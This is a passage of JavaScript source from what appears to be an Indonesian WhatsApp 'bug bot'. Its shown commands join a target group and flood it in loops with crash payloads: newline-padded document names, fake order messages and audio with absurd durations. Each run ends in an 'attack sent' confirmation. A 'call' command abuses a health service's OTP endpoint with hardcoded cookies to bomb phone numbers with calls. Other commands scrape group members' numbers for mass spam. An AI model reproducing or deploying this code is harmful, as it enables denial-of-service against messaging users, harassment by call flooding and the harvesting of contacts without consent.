Biiofc.sendMessage(mnm, { document: thumb, caption: "YOUTUBE Hardz`", fileName: `Hardz ⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${button}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid" }, { quoted: lep })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${mnm.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [mnm],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb HardzSenpaii.`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtube.com/@HardzBanxv", 
"sourceUrl": "https://youtube.com/@HardzBanxv" }}}, { quoted: m })
}
break
case "attackgc": case "mampusgc": case "gasgc": {
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!q) return reply(`Contoh ${prefix+command} linkgc|jumlah`)
if (!isUrl(q.split("|")[0]) && !q.split("|")[0].includes("whatsapp.com")) return reply("Link Invalid!")
let fhehfhe = q.split("|")[0].split("https://chat.whatsapp.com/")[1]
let mnm = await Biiofc.groupAcceptInvite(fhehfhe)
await reply(mess.wait)
global.jumlah = q.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendStimg(prrkek, ppuser, lep, { packname: "BUG BOT", author: "" })
Biiofc.sendStimg(prrkek, ppuser, lep, { packname: "BUG BOT", author: "" })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${mnm.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [mnm],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb HardzSenpaii.`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtube.com/@HardzBanxv", 
"sourceUrl": "https://youtube.com/@HardzBanxv" }}}, { quoted: m })
}
break
case "ampasgc": case "bahayagc": case "hatihatigc": {
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!q) return reply(`Contoh ${prefix+command} linkgc|jumlah`)
if (!isUrl(q.split("|")[0]) && !q.split("|")[0].includes("whatsapp.com")) return reply("Link Invalid!")
let fhehfhe = q.split("|")[0].split("https://chat.whatsapp.com/")[1]
let mnm = await Biiofc.groupAcceptInvite(fhehfhe)
await reply(mess.wait)
global.jumlah = q.split("|")[1]
for (let i = 0; i < jumlah; i++) {
const order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "391028153034238",
"thumbnail": fkethmb,
"itemCount": 9999,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": "Youtube Hardz`",
"message": `${button}`,
"sellerJid": "6282192773770@s.whatsapp.net",
"token": "AR7zJt8MasFx2Uir/fdxhkhPGDbswfWrAr2gmoyqNZ/0Wg==",
"totalAmount1000": "99999",
"totalCurrencyCode": "IDR",
}
}), { userJid: from, quoted: lep })
Biiofc.relayMessage(prrkek, order.message, { messageId: order.key.id})
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${mnm.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [mnm],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb HardzSenpaii.`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtube.com/@HardzBanxv", 
"sourceUrl": "https://youtube.com/@HardzBanxv" }}}, { quoted: m })
}
break
case "crashgc": case "stuckgc": case "ganasgc": {
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!q) return reply(`Contoh ${prefix+command} linkgc|jumlah`)
if (!isUrl(q.split("|")[0]) && !q.split("|")[0].includes("whatsapp.com")) return reply("Link Invalid!")
let fhehfhe = q.split("|")[0].split("https://chat.whatsapp.com/")[1]
let mnm = await Biiofc.groupAcceptInvite(fhehfhe)
await reply(mess.wait)
global.jumlah = q.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendMessage(prrkek, { audio: audionya, mimetype: 'audio/mp4', seconds: 999999999, ptt: false}, { quoted: lep })
Biiofc.sendMessage(prrkek, { audio: audionya, mimetype: 'audio/mp4', seconds: 999999999, ptt: false}, { quoted: lep })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${mnm.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [mnm],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb HardzSenpaii.`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtube.com/@HardzBanxv", 
"sourceUrl": "https://youtube.com/@HardzBanxv" }}}, { quoted: m })
}
break
// LAST DI ATAS
// ATTACK GROUP V2 ( PAKE ID GROUP )
case "buggc": case "shootgc": case "dorrgc":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} idgroup|jumlah\nUntuk Cek Idgroup Silahkan Ketik .cekidgc`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+"@g.us"
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendMessage(prrkek, { text: "Hardz Bug🔥`" }, { quoted: lep })
Biiofc.sendMessage(prrkek, { text: "YOUTUBE Hardz Bug🔥`" }, { quoted: lep })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb HardzSenpaii.`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtube.com/@HardzBanxv", 
"sourceUrl": "https://youtube.com/@HardzBanxv" }}}, { quoted: m })
}
break
case "attackgc": case "meninggalgc": case "matigc":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} idgroup|jumlah\nUntuk Cek Idgroup Silahkan Ketik .cekidgc`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+"@g.us"
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendMessage(prrkek, { document: thumb, caption: "YOUTUBE Hardz Bug🔥`", fileName: `Hardz Bug🔥 ⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${button}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid" }, { quoted: lep })
Biiofc.sendMessage(prrkek, { document: thumb, caption: "YOUTUBE Hardz Bug🔥`", fileName: `Hardz Bug🔥 ⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${button}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid" }, { quoted: lep })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb Rafathar Bug🔥`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtube.com/@HardzBanxv", 
"sourceUrl": "https://youtube.com/@HardzBanxv" }}}, { quoted: m })
}
break
case "seranggc": case "bomgc": case "ledakangc":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} idgroup|jumlah\nUntuk Cek Idgroup Silahkan Ketik .cekidgc`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+"@g.us"
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendStimg(prrkek, ppuser, lep, { packname: "BUG BOT", author: "" })
Biiofc.sendStimg(prrkek, ppuser, lep, { packname: "BUG BOT", author: "" })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb Hardz Bug🔥`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtube.com/@HardzBanxv", 
"sourceUrl": "https://youtube.com/@HardzBanxv" }}}, { quoted: m })
}
break
case "atomgc": case "hancur": case "bugzirgc":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} idgroup|jumlah\nUntuk Cek Idgroup Silahkan Ketik .cekidgc`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+"@g.us"
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
const order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "391028153034238",
"thumbnail": fkethmb,
"itemCount": 9999,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": "Youtube Hardz Bug🔥`",
"message": `${button}`,
"sellerJid": "6282192773770@s.whatsapp.net",
"token": "AR7zJt8MasFx2Uir/fdxhkhPGDbswfWrAr2gmoyqNZ/0Wg==",
"totalAmount1000": "99999",
"totalCurrencyCode": "IDR",
}
}), { userJid: from, quoted: lep })
Biiofc.relayMessage(prrkek, order.message, { messageId: order.key.id})
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb Hardz Bug🔥`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtube.com/@HardzBanxv", 
"sourceUrl": "https://youtube.com/@HardzBanxv" }}}, { quoted: m })
}
break
case "stuckgc2": case "baugc": case "ultigc":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} idgroup|jumlah\nUntuk Cek Idgroup Silahkan Ketik .cekidgc`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+"@g.us"
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendMessage(prrkek, { audio: audionya, mimetype: 'audio/mp4', seconds: 999999999, ptt: false}, { quoted: lep })
Biiofc.sendMessage(prrkek, { audio: audionya, mimetype: 'audio/mp4', seconds: 999999999, ptt: false}, { quoted: lep })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb Hardz Bug🔥`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtube.com/@HardzBanxv", 
"sourceUrl": "https://youtube.com/@HardzBanxv" }}}, { quoted: m })
}
break
// LAST DI ATAS
case "tts": case "gtts":{
if (!q) return reply(` contoh : ${prefix+command} yamate kudasai`)
reply(mess.wait)
const gtts = require("./all/gtts")(`id`, q)
var bby = args.join(' ')
ranm = getRandom('.mp3')
rano = getRandom('.ogg')
bby.length > 300 ? reply('Teks nya terlalu panjang kak')
: gtts.save(ranm, bby, function () {
exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
fs.unlinkSync(ranm)
buff = fs.readFileSync(rano)
if (err) return reply(mess.error)
Biiofc.sendMessage(from, { audio: buff, mimetype: "audio/mp4", ptt: false },{ quoted: m })
fs.unlinkSync(rano)
})
})
}
break
case "sticker": 
case "s": {
if (!quoted) return reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await Biiofc.sendStimg(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik')
let media = await quoted.download()
let encmedia = await Biiofc.sendStvid(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
}
}
break
case "qc": {
if (!quoted){
const getname = await Biiofc.getName(mentionUser[0])
const json = {
"type": "quote",
"format": "png",
"backgroundColor": "#FFFFFF",
"width": 512,
"height": 768,
"scale": 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": getname,
"photo": {
"url": ppuser
}
},
"text": quotedMsg.chats,
"replyMessage": {}
}
]
};
const response = axios.post('https://bot.lyo.su/quote/generate', json, {
headers: {'Content-Type': 'application/json'}
}).then(res => {
const buffer = Buffer.from(res.data.result.image, 'base64')
const opt = { packname: global.packname, author: global.author }
Biiofc.sendStimg(from, buffer, m, opt)
});
} else if (q) {
const json = {
"type": "quote",
"format": "png",
"backgroundColor": "#FFFFFF",
"width": 512,
"height": 768,
"scale": 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": pushname,
"photo": {
"url": ppuser
}
},
"text": q,
"replyMessage": {}
}
]
};
const response = axios.post('https://bot.lyo.su/quote/generate', json, {
headers: {'Content-Type': 'application/json'}
}).then(res => {
const buffer = Buffer.from(res.data.result.image, 'base64')
const opt = { packname: global.packname, author: global.author }
Biiofc.sendStimg(from, buffer, m, opt)
});
} else {
reply(`Kirim perintah ${prefix+command} text atau reply pesan dengan perintah ${prefix+command}`)
}
}
break
case "owner": {
const repf = await Biiofc.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Kontak`, 
contacts: list }, contextInfo: {
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid: [sender]
}}, { quoted: m })
Biiofc.sendMessage(from, { text : `Hai Kak @${sender.split("@")[0]}, Nih Owner Ku Jangan Macam-macam Ya`, contextInfo:{
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid:[sender]
}}, { quoted: repf })
}
break
case "call":
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} +6283183432283`)
await reply(mess.wait)
let nosend = "+" + q.split("|")[0].replace(/[^0-9]/g, '')
axios.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests',{'phone_number':`${nosend}`,'channel': 'voice'},{headers: {'authority': 'magneto.api.halodoc.com','accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7','cookie': '_gcl_au=1.1.1860823839.1661903409; _ga=GA1.2.508329863.1661903409; afUserId=52293775-f4c9-4ce2-9002-5137c5a1ed24-p; XSRF-TOKEN=12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636; _gid=GA1.2.798137486.1664887110; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2218bb4559-2170-9c14-ddcd-2dc80d13c3e3%22%2C%22c%22%3A1656491802961%2C%22l%22%3A1664887110254%7D; amp_394863=nZm2vDUbDAvSia6NQPaGum...1gehg2efd.1gehg3c19.f.0.f; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22f1b09ad8-a7d9-16f3-eb99-a97ba52677d2%22%2C%22e%22%3A1664888940400%2C%22c%22%3A1664887110252%2C%22l%22%3A1664887140400%7D','origin': 'https://www.halodoc.com','sec-ch-ua': '"Microsoft Edge";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53','x-xsrf-token': '12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636'}}).then(function (response) {reply(`${JSON.stringify(response.data, null, 2)}`)}).catch(function (error) {reply(`${JSON.stringify(error, null, 2)}`)})
break
case "addowner":
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await Biiofc.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
ownerNumber.push(bnnd)
fs.writeFileSync('./all/database/owner.json', JSON.stringify(ownerNumber))
reply(`Nomor ${bnnd} Telah Menjadi Owner!!!`)
break
case "delowner":
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = ownerNumber.indexOf(ya)
ownerNumber.splice(unp, 1)
fs.writeFileSync('./all/database/owner.json', JSON.stringify(ownerNumber))
reply(`Nomor ${ya} Telah Di Hapus Owner!!!`)
break
case "addprem":{
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync("./all/database/premium.json", JSON.stringify(prem))
reply(`Nomor ${prrkek} Telah Menjadi Premium!`)
}
break
case "delprem":{
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync("./all/database/premium.json", JSON.stringify(prem))
reply(`Nomor ${ya} Telah Di Hapus Premium!`)
}
break
case "cekidgc": {
if (!isPremium && !isOwner) return reply(mess.only.premium)
let getGroups = await Biiofc.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `⬣ *LIST GROUP DI BAWAH*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await Biiofc.groupMetadata(x)
teks += `◉ Nama : ${metadata2.subject}\n◉ ID : ${metadata2.id}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`
}
reply(teks + `Untuk Penggunaan Silahkan Ketik Command ${prefix}pushkontak id|teks\n\nSebelum Menggunakan Silahkan Salin Dulu Id Group Nya Di Atas`)
}
break
case "pushkontak":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (isGroup) return reply(mess.only.private)
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} idgroup|tekspushkontak\nUntuk Liat Id Group Silahkan Ketik .cekidgc`)
reply(mess.wait)
const groupMetadataa = !isGroup? await Biiofc.groupMetadata(`${text.split("|")[0]}`).catch(e => {}) : ""
const participants = !isGroup? await groupMetadataa.participants : ""
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkon = text.split("|")[1]
if (isContacts) return
for (let mem of halls) {
if (isContacts) return
contacts.push(mem)
fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
if (/image/.test(mime)) {
media = await Biiofc.downloadAndSaveMediaMessage(quoted)
memk = await uptotelegra(media)
await Biiofc.sendMessage(mem, { image: { url: memk }, caption: global.tekspushkon })
await sleep(1000)
} else {
await Biiofc.sendMessage(mem, { text: global.tekspushkon })
await sleep(1000)
}
}
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(1)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await Biiofc.sendMessage(from, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "Nih Kak Tinggal Pencet File Di Atas Terus Save", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
}
}
break
case "pushkontakv2":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!isGroup) return reply(mess.only.group)
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} teks`)
reply(mess.wait)
const groupMetadata = isGroup? await Biiofc.groupMetadata(from).catch(e => {}) : ""
const groupOwner = isGroup? groupMetadata.owner : ""
const participantts = isGroup? await groupMetadata.participants : ""
const halsss = await participantts.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkonv2 = text
if (isContacts) return
for (let men of halsss) {
contacts.push(men)
fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
if (/image/.test(mime)) {
media = await Biiofc.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await Biiofc.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv2 })
await sleep(1000)
} else {
await Biiofc.sendMessage(men, { text: global.tekspushkonv2 })
await sleep(1000)
}
}
reply("File Kontak Sudah Di Kirim Lewat Chat Pribadi")
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(1)}] ${contact.split("@")[0]}`,
